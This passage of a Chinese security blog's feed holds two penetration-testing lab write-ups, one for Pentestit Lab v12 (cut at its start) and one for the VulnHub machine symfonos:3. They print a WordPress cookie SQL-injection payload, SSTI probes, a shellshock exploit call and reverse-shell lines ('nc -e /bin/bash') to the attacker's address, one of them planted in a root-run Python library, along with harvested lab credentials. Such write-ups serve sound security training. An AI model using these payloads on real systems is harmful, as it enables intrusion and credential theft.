172.16.0.17</span><br></pre></td></tr></table></figure></p><p>加入本机解析（调整一下格式）<br>分析几个域名，在<code>helpdesk.test.lab</code>,发现登录窗口<br><img src="https://i.loli.net/2019/08/11/gFPtsRaj9fIZMm5.png" alt="11.png"></p><p><strong>**</strong>上班ing<strong>**</strong></p><p>使用<code>samrdump.py</code>可以导出的系统用户帐户、可用资源共享和其他敏感信息（MSRPC服务）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# python /usr/share/doc/python-impacket/examples/samrdump.py 172.16.0.17</span><br><span class="line">再稍稍加工一下</span><br><span class="line">Administrator@test.lab</span><br><span class="line">info@test.lab</span><br><span class="line">sviridov@test.lab</span><br><span class="line">sidorov@test.lab</span><br><span class="line">petrov@test.lab</span><br><span class="line">lomonosov@test.lab</span><br><span class="line">token_fopekr0mf@test.lab</span><br></pre></td></tr></table></figure></p><p>ok又出现了<a href="mailto:info@test.lab" target="_blank" rel="noopener">info@test.lab</a>，默认密码<code>123456789</code><br><img src="https://i.loli.net/2019/08/12/SC5MolD71PdHE3r.png" alt="12.png"><br>修改密码时发现ID值，像极了<code>BASHE64</code>，应该每个用户都有一个唯一的id值<br><img src="https://i.loli.net/2019/08/12/5LwGkPuW3D2rFO7.png" alt="13.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MTQ1Cg== --&gt; 145</span><br></pre></td></tr></table></figure></p><p>OK，这里有base64算法导致的坑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo 145 | base64 | sed &apos;s/=/%3D/g&apos;</span><br><span class="line">MTQ1Cg%3D%3D</span><br></pre></td></tr></table></figure></p><p>转换后就是类似这个样子<br><img src="https://i.loli.net/2019/08/12/7qHx2VD9AR1g5it.png" alt="14.png"><br>使用burp枚举id<br><img src="https://i.loli.net/2019/08/13/oPanqIL7vJw4gxV.png" alt="15.png"><br>测试完发现<a href="mailto:sviridov@test.lab" target="_blank" rel="noopener">sviridov@test.lab</a>,密码变成<code>123</code>了<br><img src="https://i.loli.net/2019/08/13/5Z9lMVUI3etXQRh.png" alt="16.png"><br>得到一个VPN账号<a href="mailto:sviridov@test.lab" target="_blank" rel="noopener">sviridov@test.lab</a>：<code>5BEiBBtrNq***************</code></p><h1 id="192-168-101-12内网"><a href="#192-168-101-12内网" class="headerlink" title="192.168.101.12内网"></a>192.168.101.12内网</h1><p>修改一下ip<code>192.168.101.12</code>,登录VPN<br>上面扫描过TCP，确定端口开放在UDP上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sU -p- 192.168.101.12</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">1194/udp open  openvpn</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# openvpn --config sviridov.conf </span><br><span class="line">Enter Auth Username: sviridov@test.lab</span><br><span class="line">Enter Auth Password: *************************</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/13/7eolyGAIm9jcrVf.png" alt="17.png"><br>继续测试域名,在<code>my.test.lab</code>上发现登录界面<br><img src="https://i.loli.net/2019/08/15/ErRO2BDPpHgQT9n.png" alt="18.png"><br><code>info:123456789</code>登陆成功<br><img src="https://i.loli.net/2019/08/13/oDXWJZc7taUvHTL.png" alt="19.png"></p><h2 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h2><p>在搜索框找到一个注入点<a href="https://www.jianshu.com/p/aef2ae0498df" target="_blank" rel="noopener">SSTI注入</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://my.test.lab/?q=&#123;&#123;7*7&#125;&#125; #使用7*7 7*&apos;7&apos;判断是Jinja2模板，使用tplmap自动化注入可以了解一些参数</span><br></pre></td></tr></table></figure></p><p>个人记录常用测试参数</p><blockquote><ul><li>config  当前的配置对象</li><li>request 当前的请求对象</li><li>session 当前的会话对象</li><li>g       全局变量的请求绑定对象。这通常由开发人员用于在请求期间存储资源。</li></ul></blockquote><p>这里是API文档的链接：<a href="http://flask.pocoo.org/docs/1.0/templating/#standard-context" target="_blank" rel="noopener">Flask</a>和<a href="http://jinja.pocoo.org/docs/dev/templates/#builtin-globals" target="_blank" rel="noopener">Jinja</a>。<br><a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">Flask / Jinja2 SSTI &amp;&amp; python沙箱逃逸</a><a href="https://evi0s.com/2018/11/26/%e6%b7%b1%e5%85%a5ssti-%e4%bb%8enctf2018%e4%b8%a4%e9%81%93flask%e7%9c%8bbypass%e6%96%b0%e5%a7%bf%e5%8a%bf/" target="_blank" rel="noopener">深入SSTI-从NCTF2018两道Flask看bypass新姿势</a><br>在输入<code>config</code>参数得到一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;SECRET_KEY&apos;: &apos;*************Wl2ZnZoei5wYnovcG5lcnJlZg==&apos;</span><br></pre></td></tr></table></figure></p><p><code>Phevbhf? aivfvhz.pbz/pnerref</code>看起来像路径，但是没有命名规则，凯撒加密<br><img src="https://i.loli.net/2019/08/14/KUzdADmOnrhPgHt.png" alt="20.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curious ?nvisium.com/careers</span><br></pre></td></tr></table></figure></p><p>然后强势一波广告<a href="https://nvisium.com/careers" target="_blank" rel="noopener">https://nvisium.com/careers</a><br>在Google上发现，他的<a href="https://nvisium.com/blog/2015/12/07/injecting-flask.html" target="_blank" rel="noopener">骚操作</a>。<br><img src="https://i.loli.net/2019/08/14/MVTPxGkt5glIA8i.png" alt="21.png"><br><code>person.secret</code>参数可以直接得到密文,但无用<br>继续向前走<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sn 172.16.0.0/16</span><br><span class="line">Nmap scan report for 172.16.0.1</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Nmap scan report for ns2.test.lab (172.16.0.10)</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Nmap scan report for site.test.lab (172.16.0.14)</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Nmap scan report for ns1.test.lab (172.16.0.17)</span><br><span class="line">Host is up (0.40s latency).</span><br><span class="line">Nmap scan report for 172.16.1.10</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Nmap scan report for 172.16.1.12</span><br><span class="line">Host is up (0.52s latency).</span><br><span class="line">Nmap scan report for 172.16.1.15</span><br><span class="line">Host is up (0.39s latency).</span><br></pre></td></tr></table></figure></p><h2 id="Wordpress-Cookie注入"><a href="#Wordpress-Cookie注入" class="headerlink" title="Wordpress Cookie注入"></a>Wordpress Cookie注入</h2><p>根据提示将<code>172.16.0.14</code>加入<code>hosts</code><br><img src="https://i.loli.net/2019/08/14/gEnq2t3FIK7yziZ.png" alt="22.png"><br>还是那个WordPress，继续测试cookie注入，终于出来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp_sap=[&quot;1650149780&apos;)) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,database(),11#&quot;]</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/15/BpIzRVTEriMmJ6u.png" alt="24.png"><br>最终Payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp_sap=[&quot;1650149780&apos;)) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,convert(name,char),11 from wordpress.token #&quot;]</span><br></pre></td></tr></table></figure></p><p>得到最终密文<code>fr5miRa****</code>，但是无用<br>继续跟进。</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>对获取新的IP地址进行分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sV -sC 172.16.0.14</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 52:41:88:d7:94:bb:9d:1d:db:fa:ed:ed:eb:ad:d2:15 (RSA)</span><br><span class="line">|_  256 3e:ca:73:6f:6e:3c:d0:2c:69:57:78:26:a4:d6:2a:08 (ECDSA)</span><br><span class="line">80/tcp open  http    nginx/1.14.2</span><br><span class="line">|_http-generator: WordPress 4.9.8</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v 172.16.1.10,12,15</span><br><span class="line">Nmap scan report for 172.16.1.10</span><br><span class="line">80/tcp open     http</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-server-header: nginx/1.10.3</span><br><span class="line">|_http-title: Site doesnt have a title (text/html; charset=utf-8).</span><br><span class="line">Nmap scan report for 172.16.1.12</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 52:41:88:d7:94:bb:9d:1d:db:fa:ed:ed:eb:ad:d2:15 (RSA)</span><br><span class="line">|_  256 3e:ca:73:6f:6e:3c:d0:2c:69:57:78:26:a4:d6:2a:08 (ECDSA)</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_http-favicon: Unknown favicon MD5: BA84999DFC070065F37A082AB0E36017</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: [PREWIKKA]</span><br><span class="line">Nmap scan report for 172.16.1.15</span><br><span class="line">80/tcp open     http</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=closed site</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br></pre></td></tr></table></figure><p><strong>172.16.1.10</strong><br>找到密文<code>token=fw3mij3f****</code><br><strong>172.16.1.12</strong><br><img src="https://i.loli.net/2019/08/16/uy7AZYRLdbxlNCP.png" alt="26.png"><br>Prewikka company ltd  <a href="https://github.com/Prelude-SIEM/prewikka" target="_blank" rel="noopener">Prelude console</a><br>能够使用<code>sviridov 5BEiBBtrNq***************</code>登录<br>翻看日志文件<br><img src="https://i.loli.net/2019/08/16/58yUD2FmdROuMoK.png" alt="28.png"><br>发现账号<br><code>admin:IFGpajdlkmaw2of</code><br><img src="https://i.loli.net/2019/08/16/gejaClXVbWN7O1Q.png" alt="29.png"><br><strong>172.16.1.15</strong><br><img src="https://i.loli.net/2019/08/16/fTZYUlAFGH7jb2g.png" alt="27.png"><br>使用admin登录<br>这里只是一个放文件的地方<br><img src="https://i.loli.net/2019/08/16/mj3FvcJ9HCBSgzx.png" alt="30.png"><br>似乎无路可走，<code>192.168.0.0</code>网段，还没有挖掘信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -Pn -p21,22,80,139,445,8080 192.168.0.0/24</span><br><span class="line">Nmap scan report for 192.168.0.10</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">--</span><br><span class="line">Nmap scan report for 192.168.0.30</span><br><span class="line">Host is up (0.79s latency).</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">--</span><br><span class="line">Nmap scan report for 192.168.0.100</span><br><span class="line">Host is up (0.77s latency).</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">--</span><br><span class="line">Nmap scan report for 192.168.0.205</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">--</span><br><span class="line">Nmap scan report for 192.168.0.240</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   open     ssh</span><br></pre></td></tr></table></figure></p><p>SSH基本都开了，使用已有用户密码尝试登陆主机<br>在<code>192.168.0.100</code>使用<a href="mailto:sviridov@test.lab" target="_blank" rel="noopener">sviridov@test.lab</a> <code>5BEiBBtrNq***************</code>登陆成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh sviridov@192.168.0.100</span><br><span class="line">sviridov@lomonosov:~$ id</span><br><span class="line">uid=10002(sviridov) gid=10004(domain users) groups=10004(domain users),10001(BUILTIN\users)</span><br></pre></td></tr></table></figure></p><p>实验终止，提权没有没有办法操作，网络延迟太高了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>信息收集很重要，尝试一次又一次找到攻击向量并尝试利用他们</p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a><br><a href="https://blog.csdn.net/wyvbboy/article/details/53907600" target="_blank" rel="noopener">NMAP速查表</a><br><a href="https://www.jianshu.com/p/a0143cc79215" target="_blank" rel="noopener">WSPCAN速查表</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Pentestit-Lab-v12&quot;&gt;&lt;a href=&quot;#Pentestit-Lab-v12&quot; class=&quot;headerlink&quot; title=&quot;Pentestit Lab v12&quot;&gt;&lt;/a&gt;Pentestit Lab v12&lt;/h1&gt;&lt;p&gt;连接方式：外国主机+openvpn（ss+openvpn是难受的）&lt;br&gt;实验目的：获取12个flag&lt;br&gt;项目地址：&lt;a href=&quot;https://lab.pentestit.ru&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://lab.pentestit.ru&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网游行" scheme="http://www.lanbainan.cn/tags/%E5%86%85%E7%BD%91%E6%B8%B8%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>对symfonos:3的测试</title>
    <link href="http://www.lanbainan.cn/2019/08/04/2019-08-04/"/>
    <id>http://www.lanbainan.cn/2019/08/04/2019-08-04/</id>
    <published>2019-08-04T02:04:00.000Z</published>
    <updated>2019-08-05T16:20:25.169Z</updated>
    
    <content type="html"><![CDATA[<h1 id="symfonos-3"><a href="#symfonos-3" class="headerlink" title="symfonos:3"></a>symfonos:3</h1><p>主机桥接模式<br>实验目的：获取flag<br>项目地址：<a href="https://www.vulnhub.com/entry/symfonos-3,332/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/symfonos-3,332/</a><br><a id="more"></a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://i.loli.net/2019/08/04/d6AYrG1ZsuHPCD7.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p- 192.168.31.90</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     ProFTPD 1.3.5b</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)</span><br><span class="line">|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)</span><br><span class="line">|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: OPTIONS HEAD GET POST</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html)</span><br></pre></td></tr></table></figure></p><h2 id="失败的枚举"><a href="#失败的枚举" class="headerlink" title="失败的枚举"></a>失败的枚举</h2><p>80端口开始<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl -i http://192.168.31.90</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/04/xnXPRv5gYQlf1er.png" alt="2.png"><br>提示枚举<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dirb http://192.168.31.90</span><br><span class="line">+ http://192.168.31.90/cgi-bin/ (CODE:403|SIZE:296)</span><br><span class="line">+ http://192.168.31.90/index.html (CODE:200|SIZE:241)</span><br><span class="line">+ http://192.168.31.90/server-status (CODE:403|SIZE:301)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/04/OEVzcFykKWBSUH4.png" alt="3.png"><br>没有在页面找到信息<br>再次尝试枚举<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/raft-large-dir ectories-lowercase.txt -u http://192.168.31.90/gate</span><br><span class="line">/cerberus (Status: 301)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/04/vrOMCPIuG8tkE9K.png" alt="4.png"><br>不是很好看啊，这个，此页面也没有找到信息，继续枚举<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/raft-large-dir ectories-lowercase.txt -u http://192.168.31.90/gate/cerberus/</span><br><span class="line">/tartarus (Status: 301)</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl -i http://192.168.31.90/gate/cerberus/tartarus/</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/04/vaAeYnMgxrt7WTm.png" alt="5.png"><br>提示说这个是残忍的并具有误导性，意味着我进入了陷阱<br>返回开始，有个<code>cgi-bin</code>,很有吸引<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gobuster -q -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium. txt -u http://192.168.31.90/cgi-bin</span><br><span class="line">/underworld (Status: 200)</span><br></pre></td></tr></table></figure></p><h2 id="shellshock漏洞"><a href="#shellshock漏洞" class="headerlink" title="shellshock漏洞"></a>shellshock漏洞</h2><p><img src="https://i.loli.net/2019/08/04/vw3lfRtqPdKND7x.png" alt="6.png"><br>和<code>uptime</code>和相识<br>在这之后访问任何url都会显示<code>uptime</code>的内容<br><img src="https://i.loli.net/2019/08/04/94fAnDciSIGYTrW.png" alt="7.png"><br>这意味着这里多半存在<a href="https://blog.51cto.com/10509896/2174506" target="_blank" rel="noopener">shellshock漏洞</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit shellshock</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/08/04/afGJmgOY1yrdzK8.png" alt="8.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# php 34766.php</span><br><span class="line">Usage: 34766.php -u URL -c cmd</span><br><span class="line">root@kali:~/Desktop# php 34766.php -u http://192.168.31.90/cgi-bin/underworld/ -c &quot;n c -e /bin/bash 192.168.31.35 1234&quot;</span><br><span class="line">λ nc -nvlp 1234</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">cerberus@symfonos3:/usr/lib/cgi-bin$ id</span><br><span class="line">uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data)</span><br></pre></td></tr></table></figure></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cerberus@symfonos3:/usr/lib/cgi-bin$ cat /etc/passwd | grep &quot;/bin/bash&quot;</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">hades:x:1000:1000:,,,:/home/hades:/bin/bash</span><br><span class="line">cerberus:x:1001:1001:,,,:/home/cerberus:/bin/bash</span><br></pre></td></tr></table></figure><p>发现新用户<code>hades</code><br>事实上使用<code>LinEnum</code>没有枚举出有帮助的信息<br>使用<code>pspy</code>(允许我们看到其他用户、cron jobs等在执行时运行的命令)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cerberus@symfonos3:/tmp$ wget https://github-download.oss-cn-hongkong.aliyuncs.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32</span><br><span class="line">cerberus@symfonos3:/tmp$ chmod 777 pspy32</span><br><span class="line">cerberus@symfonos3:/tmp$ ./pspy32</span><br></pre></td></tr></table></figure></p><p>时刻记住前面还有FTP没有利用<br><img src="https://i.loli.net/2019/08/05/dE9coHAKRkqv7iw.png" alt="9.png"><br>发现一个py脚本<br><img src="https://i.loli.net/2019/08/05/6kOwAqhsVaHYvUS.png" alt="10.png"><br>但是没有权限查看，但是可以猜测脚本与FTP服务之间有什么数据流动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cerberus@symfonos3:/tmp$ tcpdump -w ftp.pcap -i lo</span><br></pre></td></tr></table></figure></p><p>欢迎尝试各种坑</p><blockquote><p>-w 将所有数据写入<code>ftp.pcap</code><br>-i 侦听网卡</p></blockquote><p>推荐使用<code>ip</code>命令，比<code>ifconfig</code>好用的多<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cerberus@symfonos3:/tmp$ python -m SimpleHTTPServer 9999</span><br><span class="line">root@kali:~/Desktop# wget http://192.168.31.90:9999/ftp.pcap</span><br></pre></td></tr></table></figure></p><p>将数据包下载下来，进行分析<br><img src="https://i.loli.net/2019/08/05/jkiZ3PFEV8zQxHS.png" alt="11.png"><br>得到账号密码<code>hades:PTpZTfU4vxgzvRBE</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hades@symfonos3:~$ id</span><br><span class="line">uid=1000(hades) gid=1000(hades) groups=1000(hades),1002(gods)</span><br></pre></td></tr></table></figure></p><p>查看我们关注的py文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hades@symfonos3:/opt/ftpclient$ cat ftpclient.py</span><br><span class="line">import ftplib</span><br><span class="line"></span><br><span class="line">ftp = ftplib.FTP(&apos;127.0.0.1&apos;)</span><br><span class="line">ftp.login(user=&apos;hades&apos;, passwd=&apos;PTpZTfU4vxgzvRBE&apos;)</span><br><span class="line"></span><br><span class="line">ftp.cwd(&apos;/srv/ftp/&apos;)</span><br><span class="line"></span><br><span class="line">def upload():</span><br><span class="line">    filename = &apos;/opt/client/statuscheck.txt&apos;</span><br><span class="line">    ftp.storbinary(&apos;STOR &apos;+filename, open(filename, &apos;rb&apos;))</span><br><span class="line">    ftp.quit()</span><br><span class="line"></span><br><span class="line">upload()</span><br></pre></td></tr></table></figure></p><p>发现调用<code>ftplib</code>，那么将<code>shell</code>写入该文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">os.system(&quot;nc -e /bin/bash 192.168.31.35 8888&quot;)</span><br></pre></td></tr></table></figure></p><p>一会儿一个连接就来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">λ nc -nvlp 8888</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">root@symfonos3:~# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><img src="https://i.loli.net/2019/08/06/TEony3f5rsk1c8b.png" alt="12.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>枚举字典很重要，网卡并不只有一个,还有就是晚安(<em>^▽^</em>)。</p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;symfonos-3&quot;&gt;&lt;a href=&quot;#symfonos-3&quot; class=&quot;headerlink&quot; title=&quot;symfonos:3&quot;&gt;&lt;/a&gt;symfonos:3&lt;/h1&gt;&lt;p&gt;主机桥接模式&lt;br&gt;实验目的：获取flag&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/symfonos-3,332/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/symfonos-3,332/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
